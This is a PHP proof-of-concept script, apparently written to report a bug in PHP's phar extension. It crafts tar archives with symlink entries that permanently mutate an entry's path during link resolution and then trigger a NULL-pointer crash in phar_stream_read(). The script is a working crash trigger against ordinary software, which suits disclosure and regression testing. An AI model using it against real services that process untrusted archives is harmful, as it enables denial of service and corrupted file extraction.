<?php
/* Phar tar symlink: phar_get_link_location() permanently strips one path
 * component from the entry filename (8.4 writes a NUL and does not restore
 * the slash; 8.5/master replaces entry->filename). phar_stream_read() then
 * NULL-derefs when a later resolution fails.
 */
fwrite(STDERR, "PHP " . PHP_VERSION . "\n");

function tar_header($name, $sizeOctal, $type, $link) {
    $h  = str_pad($name, 100, "\0");
    $h .= "0000777\0";
    $h .= "0000000\0";
    $h .= "0000000\0";
    $h .= $sizeOctal;
    $h .= "00000000000\0";
    $h .= str_repeat(' ', 8);
    $h .= $type;
    $h .= str_pad($link, 100, "\0");
    $h .= "ustar\0" . "00";
    $h  = str_pad($h, 512, "\0");
    $sum = 0;
    for ($i = 0; $i < 512; $i++) {
        $sum += ord($h[$i]);
    }
    return substr_replace($h, sprintf("%06o\0 ", $sum), 148, 8);
}

function tar_file($name, $data) {
    $size = sprintf("%011o\0", strlen($data));
    $h = tar_header($name, $size, '0', '');
    $pad = (512 - (strlen($data) % 512)) % 512;
    return $h . $data . str_repeat("\0", $pad);
}

function tar_symlink($name, $target) {
    return tar_header($name, "00000000000\0", '2', $target);
}

function tar_end($body) {
    return $body . str_repeat("\0", 1024);
}

set_error_handler(function ($sev, $msg) {
    fwrite(STDERR, "WARN $msg\n");
    return true;
});

$base = __DIR__ . '/work-' . PHP_VERSION . '-' . getmypid();
@mkdir($base, 0777, true);
fwrite(STDERR, "WORKDIR $base\n");

/* 1. Full-path link target. One getContent() strips a component.
 * extractTo then uses the mutated filename. */
$t1 = $base . '/mut.tar';
file_put_contents($t1, tar_end(
    tar_file('a/b/c/target', 'PAYLOAD') .
    tar_symlink('a/b/c/link', 'a/b/c/target')
));
$p = new PharData($t1);
$got = $p['a/b/c/link']->getContent();
fwrite(STDERR, "MUT_CONTENT=" . var_export($got, true) . "\n");
$dest = $base . '/mut-out';
@mkdir($dest, 0777, true);
try {
    $p->extractTo($dest);
    fwrite(STDERR, "MUT_EXTRACT=ok\n");
} catch (Throwable $e) {
    fwrite(STDERR, "MUT_EXTRACT_EX=" . $e->getMessage() . "\n");
}
$linkPath = $dest . '/a/b/c/link';
fwrite(STDERR, "MUT_LINK_FILE=" . (file_exists($linkPath) ? 'yes' : 'no') . "\n");
$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dest, FilesystemIterator::SKIP_DOTS));
foreach ($it as $f) {
    fwrite(STDERR, "MUT_TREE " . str_replace($dest, '', $f->getPathname()) . "\n");
}
fflush(STDERR);

/* 2. Relative link. Four resolutions (open_entry_fp, get_efp, zero, read).
 * Three directory levels let open succeed and the read NULL-deref. */
$t2 = $base . '/crash.tar';
file_put_contents($t2, tar_end(
    tar_file('a/b/c/file', 'CCC') .
    tar_file('a/b/file', 'BBB') .
    tar_file('a/file', 'AAA') .
    tar_symlink('a/b/c/link', 'file')
));
fwrite(STDERR, "BEFORE_CRASH_READ\n");
fflush(STDERR);
$r = @file_get_contents('phar://' . $t2 . '/a/b/c/link');
fwrite(STDERR, "AFTER_READ=" . var_export($r, true) . "\n");
fflush(STDERR);
